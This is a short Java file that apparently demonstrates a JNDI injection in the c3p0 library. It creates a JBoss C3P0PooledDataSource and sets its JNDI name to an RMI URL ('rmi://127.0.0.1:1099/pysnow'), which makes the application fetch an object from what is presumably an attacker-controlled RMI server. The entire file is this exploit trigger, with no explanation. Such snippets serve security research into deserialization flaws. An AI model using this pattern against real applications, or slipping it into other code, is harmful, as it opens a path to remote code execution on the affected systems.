package C3P0;

import com.mchange.v2.c3p0.jboss.C3P0PooledDataSource;


import javax.naming.NamingException;
import java.io.*;

public class c3p0_jndi_setter_1 {
    public static void main(String[] args) throws IOException, NamingException, ClassNotFoundException {
        C3P0PooledDataSource datasource = new C3P0PooledDataSource();
        datasource.setJndiName("rmi://127.0.0.1:1099/pysnow");
    }


}